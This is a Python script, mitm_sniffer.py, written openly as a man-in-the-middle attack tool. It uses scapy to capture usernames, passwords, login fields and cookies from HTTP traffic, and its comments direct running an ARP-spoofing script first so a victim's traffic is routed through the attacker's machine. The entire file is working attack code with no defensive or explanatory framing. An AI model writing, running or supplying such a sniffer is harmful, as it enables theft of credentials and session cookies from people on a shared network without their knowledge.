# language: Python 3, file: mitm_sniffer.py, target: Linux (requires scapy + root)
# Passively sniffs HTTP credentials, cookies, and POST data on the local interface.
# Run arp_spoof.py first to route victim traffic through this machine.
from scapy.all import sniff, TCP, Raw, IP
import re

CREDS_RE = re.compile(rb'(?:user|pass|login|email|username|password|pwd|credential)[^&\r\n]*', re.IGNORECASE)

def packet_handler(pkt):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    payload = pkt[Raw].load
    src = pkt[IP].src if pkt.haslayer(IP) else '?'
    dst = pkt[IP].dst if pkt.haslayer(IP) else '?'
    sport = pkt[TCP].sport
    dport = pkt[TCP].dport
    # HTTP POST
    if b'POST' in payload or b'GET' in payload:
        lines = payload.split(b'\r\n')
        for line in lines:
            if CREDS_RE.search(line):
                print(f'\n[CREDS] {src}:{sport} -> {dst}:{dport}')
                print(f'  {line.decode(errors="replace")}')
    # Cookie sniff
    if b'Cookie:' in payload:
        for line in payload.split(b'\r\n'):
            if line.startswith(b'Cookie:'):
                print(f'\n[COOKIE] {src} -> {dst}')
                print(f'  {line.decode(errors="replace")[:200]}')

def main():
    iface = input('Interface to sniff (ex: eth0): ').strip()
    print(f'[*] Sniffing on {iface} — Ctrl+C to stop')
    sniff(iface=iface, prn=packet_handler, store=False,
          filter='tcp port 80 or tcp port 8080 or tcp port 443')

if __name__ == '__main__':
    main()
